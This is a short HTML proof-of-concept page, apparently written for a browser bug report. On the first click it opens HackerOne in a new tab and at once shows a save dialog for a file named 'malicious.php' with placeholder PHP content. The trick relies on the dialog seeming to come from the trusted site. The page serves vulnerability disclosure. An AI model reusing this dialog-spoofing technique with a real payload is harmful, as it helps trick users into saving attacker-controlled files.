<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PoC</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fafafa;
      font-family: system-ui, -apple-system, sans-serif;
      cursor: pointer;
      user-select: none;
    }
    h1 {
      max-width: 400px;
      padding: 20px;
      color: #333;
      text-align: center;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <h1>Click me anywhere to open HackerOne and download the file</h1>
  <script>
    document.addEventListener('click', async () => {
      window.open('https://hackerone.com/', '_blank');
      if (!('showSaveFilePicker' in window)) return;
      try {
        const handle = await window.showSaveFilePicker({
          suggestedName: 'malicious.php',
          types: [{ description: 'PHP Files', accept: { 'text/plain': ['.php'] } }],
        });
        const writable = await handle.createWritable();
        await writable.write('<?php echo "attacker-controlled content"; ?>');
        await writable.close();
      } catch (err) {}
    }, { once: true });
  </script>
</body>
</html>
